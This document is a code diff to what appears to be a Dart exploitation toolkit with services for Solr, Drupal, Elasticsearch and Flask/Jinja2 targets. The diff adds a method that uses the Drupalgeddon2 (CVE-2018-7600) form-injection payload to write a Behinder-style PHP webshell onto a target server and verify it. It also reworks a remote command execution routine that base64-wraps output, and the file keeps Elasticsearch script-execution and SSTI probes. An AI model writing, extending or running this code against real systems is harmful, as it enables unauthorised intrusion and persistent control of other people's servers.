@@ -2,6 +2,7 @@ import 'dart:convert';
 
 import 'package:http/http.dart' as http;
 
+import '../../../app/constants.dart';
 import 'exp_result.dart';
 import 'rce_encoder.dart';
 
@@ -16,8 +17,9 @@ class SolrExpService {
     this.timeout = const Duration(seconds: 10),
   });
 
-  String get _base =>
-      baseUrl.endsWith('/') ? baseUrl.substring(0, baseUrl.length - 1) : baseUrl;
+  String get _base => baseUrl.endsWith('/')
+      ? baseUrl.substring(0, baseUrl.length - 1)
+      : baseUrl;
 
   Future<ExpResult> check() async {
     try {
@@ -109,7 +111,6 @@ class SolrExpService {
   }
 }
 
-
 class DrupalExpService {
   final String baseUrl;
   final Duration timeout;
@@ -119,8 +120,71 @@ class DrupalExpService {
     this.timeout = const Duration(seconds: 10),
   });
 
-  String get _base =>
-      baseUrl.endsWith('/') ? baseUrl.substring(0, baseUrl.length - 1) : baseUrl;
+  String get _base => baseUrl.endsWith('/')
+      ? baseUrl.substring(0, baseUrl.length - 1)
+      : baseUrl;
+
+  Future<String?> getShell(
+    String shellContent, {
+    String password = AppConstants.defaultShellPassword,
+  }) async {
+    try {
+      const shellFile = 'php_behinder.php';
+      final shellB64 = base64.encode(utf8.encode(shellContent));
+      // 用 exec 运行 php -r 写文件，避免 assert 在目标环境里被禁用
+      final phpCmd =
+          "php -r 'file_put_contents(\"$shellFile\", base64_decode(\"$shellB64\"));'";
+      final payload =
+          'form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=${Uri.encodeQueryComponent(phpCmd)}';
+      await http
+          .post(
+            Uri.parse(
+              '$_base/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax',
+            ),
+            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+            body: payload,
+          )
+          .timeout(timeout);
+      final checkUrl = '$_base/$shellFile';
+      final check = await http.get(Uri.parse(checkUrl)).timeout(timeout);
+      if (check.statusCode == 200) return '$checkUrl Pass:$password';
+      return null;
+    } catch (_) {
+      return null;
+    }
+  }
+
+  String _cleanHtml(String html) {
+    final normalized = html
+        .replaceAll(RegExp(r'<br\s*/?>', caseSensitive: false), '\n')
+        .replaceAll(
+          RegExp(r'</(?:div|p|li|tr|th|td|ul|ol)>', caseSensitive: false),
+          '\n',
+        )
+        .replaceAll(RegExp(r'<[^>]*>'), '')
+        .replaceAll(RegExp(r'\r\n?'), '\n')
+        .replaceAll(RegExp(r'\n+'), '\n');
+    return normalized;
+  }
+
+  String? _parseOutput(String body) {
+    try {
+      final list = jsonDecode(body) as List<dynamic>;
+      final outputs = <String>[];
+      for (final item in list) {
+        if (item is Map && item['command'] == 'insert') {
+          outputs.add(item['data'] as String? ?? '');
+        }
+      }
+      if (outputs.isNotEmpty) {
+        return _cleanHtml(outputs.join('\n')).trim();
+      }
+    } catch (_) {}
+    if (body.isEmpty) return null;
+    final cleaned = _cleanHtml(body).trim();
+    if (cleaned.isNotEmpty) return cleaned;
+    return null;
+  }
 
   Future<ExpResult> check() async {
     try {
@@ -147,26 +211,38 @@ class DrupalExpService {
     return const ExpResult(false, 'CVE-2018-7600 (Drupalgeddon2)', '');
   }
 
+  String _buildSafeCommand(String cmd) {
+    final trimmed = cmd.trim();
+    // 强制输出 base64 单行，免受 Drupal AJAX 嵌入 HTML 换行影响
+    if (trimmed.contains('base64')) {
+      return trimmed;
+    }
+    return '$trimmed | base64 | tr -d "\\n"';
+  }
+
   Future<String?> execRce(String cmd) async {
     try {
-      // Pass body as a Map so http.dart URL-encodes each value; avoids cmd
-      // containing '&', '=', or '#' breaking the form field boundaries.
+      final safeCmd = _buildSafeCommand(cmd);
+      final payload =
+          'form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=${Uri.encodeQueryComponent(safeCmd)}';
       final res = await http
           .post(
             Uri.parse(
               '$_base/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax',
             ),
             headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-            body: {
-              'form_id': 'user_register_form',
-              '_drupal_ajax': '1',
-              'mail[#post_render][]': 'exec',
-              'mail[#type]': 'markup',
-              'mail[#markup]': cmd,
-            },
+            body: payload,
           )
           .timeout(timeout);
-      return res.body.isNotEmpty ? res.body : null;
+      final out = _parseOutput(res.body);
+      if (out == null || out.isEmpty) return null;
+      // 先尝试把执行结果当 base64 解码，还原原始输出。失败则返回原串。
+      try {
+        final decoded = utf8.decode(base64.decode(out.trim()));
+        return decoded;
+      } catch (_) {
+        return out;
+      }
     } catch (_) {
       return null;
     }
@@ -182,15 +258,18 @@ class ElasticsearchExpService {
     this.timeout = const Duration(seconds: 10),
   });
 
-  String get _base =>
-      baseUrl.endsWith('/') ? baseUrl.substring(0, baseUrl.length - 1) : baseUrl;
+  String get _base => baseUrl.endsWith('/')
+      ? baseUrl.substring(0, baseUrl.length - 1)
+      : baseUrl;
 
   Future<ExpResult> check() async {
     try {
       final payload = jsonEncode({
         'size': 1,
         'script_fields': {
-          'result': {'script': 'def cmd="echo 54289"; def res=cmd.execute().text; res'},
+          'result': {
+            'script': 'def cmd="echo 54289"; def res=cmd.execute().text; res',
+          },
         },
       });
       final res = await http
@@ -232,7 +311,8 @@ class ElasticsearchExpService {
           final decoded = jsonDecode(res.body);
           final hits = decoded['hits']?['hits'] as List?;
           if (hits != null && hits.isNotEmpty) {
-            return hits.first['fields']?['result']?.first?.toString() ?? res.body;
+            return hits.first['fields']?['result']?.first?.toString() ??
+                res.body;
           }
         } catch (_) {}
         return res.body;
@@ -253,15 +333,20 @@ class FlaskSstiExpService {
     this.timeout = const Duration(seconds: 10),
   });
 
-  String get _base =>
-      baseUrl.endsWith('/') ? baseUrl.substring(0, baseUrl.length - 1) : baseUrl;
+  String get _base => baseUrl.endsWith('/')
+      ? baseUrl.substring(0, baseUrl.length - 1)
+      : baseUrl;
 
   Future<ExpResult> check() async {
     try {
       final url = '$_base/?$paramName={{233*233}}';
       final res = await http.get(Uri.parse(url)).timeout(timeout);
       if (res.body.contains('54289')) {
-        return ExpResult(true, 'Flask/Jinja2 SSTI', 'SSTI 存在，233×233=54289 验证通过');
+        return ExpResult(
+          true,
+          'Flask/Jinja2 SSTI',
+          'SSTI 存在，233×233=54289 验证通过',
+        );
       }
     } catch (_) {}
     return const ExpResult(false, 'Flask/Jinja2 SSTI', '');
